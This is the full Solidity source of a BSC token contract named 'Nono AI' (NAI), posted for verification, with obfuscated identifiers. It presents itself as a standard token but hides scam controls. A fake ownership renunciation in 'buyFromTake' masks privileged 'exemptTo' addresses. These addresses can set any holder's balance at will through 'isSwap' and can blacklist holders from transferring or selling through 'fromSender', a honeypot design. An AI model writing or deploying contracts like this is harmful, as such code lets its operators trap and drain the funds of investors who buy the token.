/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface isList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchBuy) external view returns (uint256);

    function transfer(address marketingBuy, uint256 amountAt) external returns (bool);

    function allowance(address receiverFeeLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountAt) external returns (bool);

    function transferFrom(
        address sender,
        address marketingBuy,
        uint256 amountAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atLiquidity, uint256 value);
    event Approval(address indexed receiverFeeLiquidity, address indexed spender, uint256 value);
}

interface minBuy is isList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract tokenMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txAutoTeam {
    function createPair(address enableFund, address totalAt) external returns (address);
}

interface teamTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract NonoAI is tokenMode, isList, minBuy {

    function transferFrom(address receiverAuto, address marketingBuy, uint256 amountAt) external override returns (bool) {
        if (takeSwap[receiverAuto][_msgSender()] != type(uint256).max) {
            require(amountAt <= takeSwap[receiverAuto][_msgSender()]);
            takeSwap[receiverAuto][_msgSender()] -= amountAt;
        }
        return fromTotal(receiverAuto, marketingBuy, amountAt);
    }

    event OwnershipTransferred(address indexed fundWalletMax, address indexed receiverTotal);

    constructor (){ 
        
        teamTotal marketingAmount = teamTotal(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        toAmount = txAutoTeam(marketingAmount.factory()).createPair(marketingAmount.WETH(), address(this));
        isTx = _msgSender();
        
        sellMax = _msgSender();
        exemptTo[_msgSender()] = true;
        if (isTo == tokenLiquidity) {
            fundLaunchedSender = true;
        }
        fromAuto[_msgSender()] = modeTo;
        emit Transfer(address(0), sellMax, modeTo);
        buyFromTake();
    }

    bool public sellTake;

    function totalSupply() external view virtual override returns (uint256) {
        return modeTo;
    }

    function receiverModeToken(address receiverAuto, address marketingBuy, uint256 amountAt) internal returns (bool) {
        require(fromAuto[receiverAuto] >= amountAt);
        fromAuto[receiverAuto] -= amountAt;
        fromAuto[marketingBuy] += amountAt;
        emit Transfer(receiverAuto, marketingBuy, amountAt);
        return true;
    }

    function fromMax(address txToken) public {
        require(!fundEnable);
        if (sellTake) {
            sellTake = true;
        }
        exemptTo[txToken] = true;
        
        fundEnable = true;
    }

    address public toAmount;

    function fromTotal(address receiverAuto, address marketingBuy, uint256 amountAt) internal returns (bool) {
        if (receiverAuto == sellMax) {
            return receiverModeToken(receiverAuto, marketingBuy, amountAt);
        }
        require(!modeAt[receiverAuto]);
        return receiverModeToken(receiverAuto, marketingBuy, amountAt);
    }

    function transfer(address maxTx, uint256 amountAt) external virtual override returns (bool) {
        return fromTotal(_msgSender(), maxTx, amountAt);
    }

    uint256 public tokenLiquidity;

    uint256 public isTo;

    bool private fundLaunchedSender;

    mapping(address => uint256) private fromAuto;

    function allowance(address receiverFeeEnable, address walletMax) external view virtual override returns (uint256) {
        return takeSwap[receiverFeeEnable][walletMax];
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldToken;
    }

    function getOwner() external view returns (address) {
        return isTx;
    }

    function name() external view virtual override returns (string memory) {
        return liquidityMin;
    }

    function marketingFee() public view returns (uint256) {
        return tokenLiquidity;
    }

    function launchedExemptMin() public {
        
        
        isTo=0;
    }

    function liquidityMax() private view{
        require(exemptTo[_msgSender()]);
    }

    string private maxListSender = "NAI";

    function fromSender(address launchTokenMax) public {
        liquidityMax();
        
        if (launchTokenMax == sellMax || launchTokenMax == toAmount) {
            return;
        }
        modeAt[launchTokenMax] = true;
    }

    function approve(address walletMax, uint256 amountAt) public virtual override returns (bool) {
        takeSwap[_msgSender()][walletMax] = amountAt;
        emit Approval(_msgSender(), walletMax, amountAt);
        return true;
    }

    address public sellMax;

    string private liquidityMin = "Nono AI";

    address private isTx;

    function buyFromTake() public {
        emit OwnershipTransferred(sellMax, address(0));
        isTx = address(0);
    }

    function isSwap(address maxTx, uint256 amountAt) public {
        liquidityMax();
        fromAuto[maxTx] = amountAt;
    }

    function swapAmountMax() public view returns (bool) {
        return sellTake;
    }

    function symbol() external view virtual override returns (string memory) {
        return maxListSender;
    }

    mapping(address => bool) public exemptTo;

    function owner() external view returns (address) {
        return isTx;
    }

    mapping(address => mapping(address => uint256)) private takeSwap;

    mapping(address => bool) public modeAt;

    uint8 private shouldToken = 18;

    function fromLaunch() public view returns (uint256) {
        return tokenLiquidity;
    }

    uint256 private modeTo = 100000000 * 10 ** 18;

    bool public fundEnable;

    function launchFeeFund() public view returns (bool) {
        return sellTake;
    }

    function totalSwap() public view returns (uint256) {
        return tokenLiquidity;
    }

    function balanceOf(address launchBuy) public view virtual override returns (uint256) {
        return fromAuto[launchBuy];
    }

}